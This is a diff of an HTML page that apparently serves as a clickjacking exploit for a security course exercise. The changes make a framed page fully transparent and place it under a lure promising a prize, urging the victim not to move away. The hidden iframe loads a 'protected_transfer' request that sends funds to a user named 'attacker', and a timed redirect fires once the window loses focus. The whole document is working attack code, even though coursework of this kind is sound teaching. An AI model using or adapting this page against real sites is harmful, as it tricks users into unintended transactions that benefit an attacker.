@@ -2,7 +2,7 @@
 <head>
 <style>
 #parentDiv { position:relative; }
-#childDiv { position:absolute; left:0px; top:0px; opacity: 0.5; }
+#childDiv { position:absolute; left:0px; top:0px; opacity: 0; }
 p    {color:red;font-family:courier;font-size:160%;}
 </style>
 <script>
@@ -14,8 +14,8 @@ document.getElementById("second").focus();
 
 <body bgcolor="black">
 <div id="parentDiv" onload="putFocus()">
-<div style="position: absolute; left: 10px; top: 10px;"><p><-------SEE THE BUTTON IN THE TOP-LEFT...HO...HO...CLICK AND WIN!!! <p></div>
-<div id="anotherDiv" style="position: absolute; left: 50px; top: 50px;"></div>
+<div style="position: absolute; left: 100px; top: 140px;"><p><-------SEE THE RED BUTTON...HO...HO...CLICK AND WIN A LUNCH WITH TOM RISTENPART!!!</br>DO NOT MOVE AWAY FROM THE BLACK WINDOW. YOU WILL LOOSE IT! <p></div>
+<div id="anotherDiv" style="position: absolute; left: 100px; top: 300px;"></div>
 <input type="button" id="first" style="position: absolute; left: 20px; top: 170px; color: red; font-weight: bold; z-index:-1" value="Clickm"></input>
 
 <script>
@@ -24,7 +24,7 @@ window.onblur = blurText;
 function blurText() {
 //alert("blur event detected!");
  setTimeout(function(){
-    //document.location="http://pages.cs.wisc.edu/~rist/642-fall-2014/.";
+    document.location="http://pages.cs.wisc.edu/~rist/642-fall-2014/.";
 }, 5000);
    // remove the event to stop an infinite loop!
   window.onblur = '';
@@ -39,7 +39,7 @@ var element = document.getElementById("anotherDiv");
 element.appendChild(para);
 }
 </script>
-<iframe sandbox="allow-scripts allow-forms" id="childDiv" width="750px" height="500px" scrolling="no" src="http://localhost:3000/protected_transfer?user=attacker&quantity=10#main"></iframe>
+<iframe sandbox="allow-scripts allow-forms" id="childDiv" width="75px" height="205px" scrolling="no" src="http://localhost:3000/protected_transfer?user=attacker&quantity=10#main"></iframe>
 </div>
 </body>
 </html>
